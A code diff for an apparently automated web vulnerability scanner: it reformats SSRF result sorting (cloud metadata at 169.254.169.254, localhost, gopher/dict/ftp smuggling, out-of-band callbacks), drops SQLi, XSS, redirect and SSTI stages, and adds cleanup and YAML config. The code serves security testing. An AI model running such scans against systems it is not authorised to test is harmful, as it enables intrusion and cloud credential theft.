-            oob_findings = [u for u in vuln_urls if self.interactsh_url and self.interactsh_url in u]
-            
-            logger.info(f"{color.RED}[!] Found {len(vuln_urls)} potential SSRF vulnerabilities:{color.END}")
-            
+            cloud_findings = [
+                u for u in vuln_urls if "169.254.169.254" in u or "metadata" in u
+            ]
+            localhost_findings = [
+                u for u in vuln_urls if "localhost" in u or "127.0.0.1" in u
+            ]
+            protocol_findings = [
+                u
+                for u in vuln_urls
+                if any(p in u for p in ["dict://", "gopher://", "ftp://"])
+            ]
+            oob_findings = [
+                u for u in vuln_urls if self.interactsh_url and self.interactsh_url in u
+            ]
+
+            logger.info(
+                f"{color.RED}[!] Found {len(vuln_urls)} potential SSRF vulnerabilities:{color.END}"
+            )
+
             if cloud_findings:
-                logger.info(f"{color.RED}  Cloud Metadata Endpoints ({len(cloud_findings)}):{color.END}")
+                logger.info(
+                    f"{color.RED}  Cloud Metadata Endpoints ({len(cloud_findings)}):{color.END}"
+                )
                 for url in cloud_findings[:3]:
                     logger.info(f"    - {url}")
-                    
+
             if localhost_findings:
-                logger.info(f"{color.RED}  Localhost Access ({len(localhost_findings)}):{color.END}")
+                logger.info(
+                    f"{color.RED}  Localhost Access ({len(localhost_findings)}):{color.END}"
+                )
                 for url in localhost_findings[:3]:
                     logger.info(f"    - {url}")
-                    
+
             if protocol_findings:
-                logger.info(f"{color.RED}  Protocol Smuggling ({len(protocol_findings)}):{color.END}")
+                logger.info(
+                    f"{color.RED}  Protocol Smuggling ({len(protocol_findings)}):{color.END}"
+                )
                 for url in protocol_findings[:3]:
                     logger.info(f"    - {url}")
-                    
+
             if oob_findings:
-                logger.info(f"{color.RED}  Out-of-Band Interactions ({len(oob_findings)}):{color.END}")
-                logger.info(f"    - Monitor interactions at: https://{self.interactsh_url}")
-                
+                logger.info(
+                    f"{color.RED}  Out-of-Band Interactions ({len(oob_findings)}):{color.END}"
+                )
+                logger.info(
+                    f"    - Monitor interactions at: https://{self.interactsh_url}"
+                )
+
             # Save categorized results
-            self._save_categorized_results(cloud_findings, localhost_findings, protocol_findings, oob_findings)
-            
+            self._save_categorized_results(
+                cloud_findings, localhost_findings, protocol_findings, oob_findings
+            )
+
         except Exception as e:
             logger.error(f"{color.RED}[-] Error analyzing results: {e}{color.END}")
 
@@ -1249,86 +1129,42 @@ class SSRF:
         try:
             base_dir = f"{self.output_file}/vuln/ssrf"
             os.makedirs(base_dir, exist_ok=True)
-            
+
             if cloud:
-                with open(f"{base_dir}/cloud-metadata.txt", 'w') as f:
+                with open(f"{base_dir}/cloud-metadata.txt", "w") as f:
                     f.write("\n".join(cloud))
-                    
+
             if localhost:
-                with open(f"{base_dir}/localhost-access.txt", 'w') as f:
+                with open(f"{base_dir}/localhost-access.txt", "w") as f:
                     f.write("\n".join(localhost))
-                    
+
             if protocol:
-                with open(f"{base_dir}/protocol-smuggling.txt", 'w') as f:
+                with open(f"{base_dir}/protocol-smuggling.txt", "w") as f:
                     f.write("\n".join(protocol))
-                    
+
             if oob:
-                with open(f"{base_dir}/oob-interactions.txt", 'w') as f:
+                with open(f"{base_dir}/oob-interactions.txt", "w") as f:
                     f.write("\n".join(oob))
-                    
+
         except Exception as e:
-            logger.error(f"{color.RED}[-] Error saving categorized results: {e}{color.END}")
+            logger.error(
+                f"{color.RED}[-] Error saving categorized results: {e}{color.END}"
+            )
 
     def _check_tool_installed(self, tool_name):
         """Check if a required tool is installed"""
         try:
-            subprocess.run([tool_name, '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(
+                [tool_name, "--help"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
             return True
         except FileNotFoundError:
-            logger.warning(f"{color.YELLOW}[!] {tool_name} not installed, skipping related tests{color.END}")
+            logger.warning(
+                f"{color.RED}[!] {tool_name} not installed, skipping related tests{color.END}"
+            )
             return False
-
-class SQLI:
-    """Class to test for SQL Injection vulnerabilities"""
-
-    def __init__(self, domains, output_file):
-        """
-        Initialize with domains file and output directory
-
-        Args:
-            domains (str): Path to file containing target domains
-            output_file (str): Path to output directory
-        """
-        self.domains = domains
-        self.output_file = output_file
-
-    def ghauri(self):
-        """Test for SQL Injection vulnerabilities using Ghauri"""
-        # Open the output file for appending results
-        urls = f"{self.output_file}/urls/gf-sqli.txt"
-        output = f"{self.output_file}/vuln/sqli.txt"
-        with open(output, "a") as f:
-            for domain in urls:
-                # Construct the ghauri command for each domain
-                command = [
-                    "ghauri",
-                    "-u",
-                    f"http://{domain}",
-                    "--batch",
-                    "--ignore-code",
-                    "401,403",
-                    "--level",
-                    "3",
-                    "--banner",
-                    "--hostname",
-                ]
-
-                try:
-                    # Execute the ghauri command and capture output
-                    result = subprocess.run(
-                        command, capture_output=True, text=True, check=True
-                    )
-
-                    # Write the output to the file
-                    f.write(f"Results for {domain}:\n")
-                    f.write(result.stdout)
-                    f.write("\n" + "=" * 40 + "\n\n")
-
-                except subprocess.CalledProcessError as e:
-                    # If ghauri encounters an error, log it
-                    f.write(f"Error scanning {domain}:\n")
-                    f.write(e.stderr)
-                    f.write("\n" + "=" * 40 + "\n\n")
 
 
 class Nuclei:
@@ -1388,6 +1224,79 @@ class TelegramNotify:
             )
 
 
+class Cleanup:
+    """Class to handle cleanup of empty files and directories"""
+
+    def __init__(self, output_file, config):
+        """
+        Initialize with output directory and config
+
+        Args:
+            output_file (str): Path to output directory
+            config (dict): Cleanup configuration from YAML
+        """
+        self.output_file = output_file
+        self.config = config.get("cleanup", {})
+        self.remove_empty_files = self.config.get("remove_empty_files", True)
+        self.remove_empty_dirs = self.config.get("remove_empty_dirs", True)
+
+    @loading_animation(
+        f"{color.GREEN}[+] Cleaning up empty files and directories{color.END}"
+    )
+    def cleanup(self):
+        """Remove empty files and directories based on config"""
+        try:
+            if self.remove_empty_files:
+                self._remove_empty_files()
+            if self.remove_empty_dirs:
+                self._remove_empty_dirs()
+            logger.info(f"{color.GREEN}[+] Cleanup completed{color.END}")
+        except Exception as e:
+            logger.exception(f"{color.RED}Error during cleanup: {e}{color.END}")
+
+    def _remove_empty_files(self):
+        """Remove all empty files in the output directory"""
+        for root, _, files in os.walk(self.output_file):
+            for file in files:
+                file_path = os.path.join(root, file)
+                if os.path.getsize(file_path) == 0:
+                    try:
+                        os.remove(file_path)
+                        logger.debug(f"Removed empty file: {file_path}")
+                    except Exception as e:
+                        logger.error(f"Failed to remove {file_path}: {e}")
+
+    def _remove_empty_dirs(self):
+        """Remove all empty directories in the output directory"""
+        for root, dirs, _ in os.walk(self.output_file, topdown=False):
+            for dir_name in dirs:
+                dir_path = os.path.join(root, dir_name)
+                try:
+                    if not os.listdir(dir_path):  # Directory is empty
+                        os.rmdir(dir_path)
+                        logger.debug(f"Removed empty directory: {dir_path}")
+                except Exception as e:
+                    logger.error(f"Failed to remove {dir_path}: {e}")
+
+
+def load_config(config_path="config.yaml"):
+    """Load configuration from YAML file"""
+    try:
+        with open(config_path, "r") as f:
+            return yaml.safe_load(f)
+    except FileNotFoundError:
+        logger.warning(
+            f"{color.RED}(!) Config file not found, using defaults{color.END}"
+        )
+        return {
+            "telegram": {"token": "", "chat_id": ""},
+            "cleanup": {"remove_empty_files": True, "remove_empty_dirs": True},
+        }
+    except Exception as e:
+        logger.error(f"{color.RED}Error loading config: {e}{color.END}")
+        raise
+
+
 def done():
     print(
         rf"""{color.GREEN}
@@ -1407,21 +1316,66 @@ def main():
         description="Web Application Vulnerability Scanner"
     )
     parser.add_argument(
-        "-d", "--domains", required=True, help="Path to file containing list of domains"
+        "-d", "--domains", help="Path to file containing list of domains"
     )
-    parser.add_argument("-o", "--output", required=True, help="Output directory name")
+    parser.add_argument("-o", "--output", help="Output directory name")
+    parser.add_argument(
+        "-c", "--config", default="config.yaml", help="Path to config file"
+    )
+    parser.add_argument(
+        "--cleanup-only",
+        action="store_true",
+        help="Run only the cleanup process on existing output directory",
+    )
     args = parser.parse_args()
+
+    # Load configuration
+    config = load_config(args.config)
+
+    # Get Telegram config from YAML
+    telegram_config = config.get("telegram", {})
+    telegram_token = telegram_config.get("token", "")
+    telegram_chat_id = telegram_config.get("chat_id", "")
+
+    # Create notifier instance
+    notifier = TelegramNotify(telegram_token, telegram_chat_id)
+
+    # Handle cleanup-only mode
+    if args.cleanup_only:
+        if not args.output:
+            logger.error(
+                f"{color.RED}Error: Output directory (-o) must be specified for cleanup{color.END}"
+            )
+            return
+
+        try:
+            # Just run cleanup and exit
+            cleaner = Cleanup(args.output, config)
+            cleaner.cleanup()
+            notifier.notify_telegram(
+                telegram_token, telegram_chat_id, "(+) Cleanup process completed"
+            )
+            return
+        except Exception as e:
+            logger.exception("Failed during cleanup")
+            notifier.notify_telegram(
+                telegram_token, telegram_chat_id, "(-) Cleanup process failed"
+            )
+            return
+
+    # Validate required arguments for normal scan
+    if not args.domains or not args.output:
+        logger.error(
+            f"{color.RED}Error: Both domains (-d) and output (-o) must be specified for scanning{color.END}"
+        )
+        return
 
     domains = args.domains
     output_file = args.output
     pwd = os.getcwd()
     real_time = date.now()
     formatted_time = real_time.strftime("%Y-%m-%d %H:%M:%S")
-    telegram_token = ""
-    telegram_chat_id = ""
 
-    # Create an instance of TelegramNotify
-    notifier = TelegramNotify(telegram_token, telegram_chat_id)
     notifier.notify_telegram(
         telegram_token,
         telegram_chat_id,
@@ -1513,37 +1467,9 @@ def main():
         )
 
     try:
-        # Execute XSS and notify
-        xss = XSS(domains, output_file)
-        xss.xss_cli()
-        notifier.notify_telegram(
-            telegram_token, telegram_chat_id, "(+) XSS tests completed"
-        )
-        logger.info("XSS tests completed")
-    except Exception as e:
-        logger.exception("Failed during XSS tests")
-        notifier.notify_telegram(
-            telegram_token, telegram_chat_id, "(-) XSS tests failed"
-        )
-
-    try:
-        # Execute OpenRedirect and notify
-        open_redirect = OpenRedirect(domains, output_file)
-        open_redirect.openredirex()
-        notifier.notify_telegram(
-            telegram_token, telegram_chat_id, "(+) Open Redirect scan completed"
-        )
-        logger.info("Open Redirect scan completed")
-    except Exception as e:
-        logger.exception("Failed during Open Redirect scan")
-        notifier.notify_telegram(
-            telegram_token, telegram_chat_id, "(-) Open Redirect scan failed"
-        )
-
-    try:
         # Execute LFI and notify
         lfi = LFI(domains, output_file)
-        lfi.lfi_cli()
+        lfi.run_all()
         notifier.notify_telegram(
             telegram_token, telegram_chat_id, "(+) LFI test completed"
         )
@@ -1552,20 +1478,6 @@ def main():
         logger.exception("Failed during LFI test")
         notifier.notify_telegram(
             telegram_token, telegram_chat_id, "(-) LFI test failed"
-        )
-
-    try:
-        # Execute SSTI and notify
-        ssti = SSTI(domains, output_file)
-        ssti.ssti_cli()
-        notifier.notify_telegram(
-            telegram_token, telegram_chat_id, "(+) SSTI test completed"
-        )
-        logger.info("SSTI test completed")
-    except Exception as e:
-        logger.exception("Failed during SSTI test")
-        notifier.notify_telegram(
-            telegram_token, telegram_chat_id, "(-) SSTI test failed"
         )
 
     try:
@@ -1580,20 +1492,6 @@ def main():
         logger.exception("Failed during SSRF test")
         notifier.notify_telegram(
             telegram_token, telegram_chat_id, "(-) SSRF test failed"
-        )
-
-    try:
-        # Execute SQLI and notify
-        sqli = SQLI(domains, output_file)
-        sqli.ghauri()
-        notifier.notify_telegram(
-            telegram_token, telegram_chat_id, "(+) SQL Injection test completed"
-        )
-        logger.info("SQL Injection test completed")
-    except Exception as e:
-        logger.exception("Failed during SQL Injection test")
-        notifier.notify_telegram(
-            telegram_token, telegram_chat_id, "(-) SQL Injection test failed"
         )
 
     try:
@@ -1614,6 +1512,12 @@ def main():
     try:
         # The scan is done, notify
         finder.download_and_scan_js()
+
+        # Run cleanup if configured
+        if config.get("cleanup", {}).get("enabled", True):
+            cleaner = Cleanup(output_file, config)
+            cleaner.cleanup()
+
         done()
         notifier.notify_telegram(
             telegram_token,
